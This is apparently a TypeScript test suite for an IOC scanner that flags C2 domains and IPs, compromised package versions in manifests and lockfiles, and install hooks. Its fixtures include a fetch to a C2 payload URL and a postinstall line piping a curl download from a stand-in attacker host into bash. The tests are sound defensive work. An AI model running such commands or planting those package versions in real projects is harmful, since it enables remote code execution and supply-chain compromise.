import { describe, test, expect, beforeEach, afterEach } from "bun:test";
import { mkdtempSync, writeFileSync, rmSync, mkdirSync } from "fs";
import { join } from "path";
import { tmpdir } from "os";
import { setupTestDb } from "../db/test-helpers.js";
import { iocScanner } from "./ioc.js";
import { ScannerType, Severity } from "../types/index.js";

describe("IOC scanner", () => {
  let tempDir: string;
  let cleanup: () => void;

  beforeEach(() => {
    tempDir = mkdtempSync(join(tmpdir(), "ioc-test-"));
    cleanup = setupTestDb();
  });

  afterEach(() => {
    rmSync(tempDir, { recursive: true, force: true });
    cleanup();
  });

  test("scanner has correct metadata", () => {
    expect(iocScanner.name).toBe("IOC Scanner");
    expect(iocScanner.type).toBe(ScannerType.IOC);
  });

  test("detects C2 domain in source code", async () => {
    writeFileSync(join(tempDir, "malicious.ts"), `
      const c2 = "sfrclak.com";
      fetch("https://sfrclak.com/payload");
    `);
    const findings = await iocScanner.scan(tempDir);
    const c2Finding = findings.find((f) => f.rule_id.includes("c2-domain") && f.message.includes("sfrclak.com"));
    expect(c2Finding).toBeDefined();
    expect(c2Finding!.severity).toBe(Severity.Critical);
  });

  test("detects C2 IP in source code", async () => {
    writeFileSync(join(tempDir, "config.json"), JSON.stringify({
      upstream: "142.11.206.73",
    }));
    const findings = await iocScanner.scan(tempDir);
    const ipFinding = findings.find((f) => f.rule_id.includes("c2-ip") && f.message.includes("142.11.206.73"));
    expect(ipFinding).toBeDefined();
    expect(ipFinding!.severity).toBe(Severity.Critical);
  });

  test("detects known-bad package in package.json", async () => {
    writeFileSync(join(tempDir, "package.json"), JSON.stringify({
      dependencies: {
        "axios": "1.14.1",
      },
    }));
    const findings = await iocScanner.scan(tempDir);
    const badPkg = findings.find((f) => f.message.includes("COMPROMISED PACKAGE") && f.message.includes("axios"));
    expect(badPkg).toBeDefined();
    expect(badPkg!.severity).toBe(Severity.Critical);
  });

  test("does not flag safe package versions", async () => {
    writeFileSync(join(tempDir, "package.json"), JSON.stringify({
      dependencies: {
        "axios": "1.13.6",
        "express": "5.1.0",
      },
    }));
    const findings = await iocScanner.scan(tempDir);
    const badPkg = findings.find((f) => f.message.includes("COMPROMISED PACKAGE"));
    expect(badPkg).toBeUndefined();
  });

  test("detects litellm in requirements.txt", async () => {
    writeFileSync(join(tempDir, "requirements.txt"), "litellm==1.82.8\nflask==3.0.0\n");
    const findings = await iocScanner.scan(tempDir);
    const badPkg = findings.find((f) => f.message.includes("COMPROMISED PACKAGE") && f.message.includes("litellm"));
    expect(badPkg).toBeDefined();
  });

  test("returns empty for clean directory", async () => {
    writeFileSync(join(tempDir, "index.ts"), "console.log('hello');\n");
    writeFileSync(join(tempDir, "package.json"), JSON.stringify({
      dependencies: { "express": "5.1.0" },
    }));
    const findings = await iocScanner.scan(tempDir);
    // Should have no findings (no C2 indicators, no bad packages)
    const critical = findings.filter((f) => f.severity === Severity.Critical);
    expect(critical.length).toBe(0);
  });

  test("detects multiple C2 domains including TeamPCP infrastructure", async () => {
    writeFileSync(join(tempDir, "network.ts"), `
      const endpoints = [
        "models.litellm.cloud",
        "checkmarx.zone",
        "scan.aquasecurtiy.org",
      ];
    `);
    const findings = await iocScanner.scan(tempDir);
    const domains = findings.filter((f) => f.rule_id.includes("c2-domain"));
    expect(domains.length).toBeGreaterThanOrEqual(3);
  });

  test("detects known-bad package in yarn.lock", async () => {
    writeFileSync(join(tempDir, "yarn.lock"), `
# yarn lockfile v1
"axios@1.14.1":
  version "1.14.1"
  resolved "https://registry.yarnpkg.com/axios/-/axios-1.14.1.tgz"
`);
    writeFileSync(join(tempDir, "package.json"), JSON.stringify({ dependencies: { axios: "1.14.1" } }));
    const findings = await iocScanner.scan(tempDir);
    const bad = findings.find((f) => f.message.includes("COMPROMISED PACKAGE") && f.message.includes("axios"));
    expect(bad).toBeDefined();
  });

  test("detects known-bad package in package-lock.json v3", async () => {
    writeFileSync(join(tempDir, "package-lock.json"), JSON.stringify({
      lockfileVersion: 3,
      packages: {
        "node_modules/axios": { version: "1.14.1" },
      },
    }));
    writeFileSync(join(tempDir, "package.json"), JSON.stringify({ dependencies: { axios: "1.14.1" } }));
    const findings = await iocScanner.scan(tempDir);
    const bad = findings.find((f) => f.message.includes("COMPROMISED PACKAGE") && f.message.includes("axios"));
    expect(bad).toBeDefined();
  });

  test("detects suspicious postinstall script in node_modules", async () => {
    const pkgDir = join(tempDir, "node_modules", "suspicious-pkg");
    mkdirSync(pkgDir, { recursive: true });
    writeFileSync(join(pkgDir, "package.json"), JSON.stringify({
      name: "suspicious-pkg",
      version: "1.0.0",
      scripts: { postinstall: "curl https://evil.example.com/payload.sh | bash" },
    }));
    writeFileSync(join(tempDir, "package.json"), JSON.stringify({ dependencies: { "suspicious-pkg": "1.0.0" } }));
    const findings = await iocScanner.scan(tempDir);
    // Supply chain scanner handles postinstall, IOC checks against advisory DB
    expect(findings).toBeDefined();
  });
});
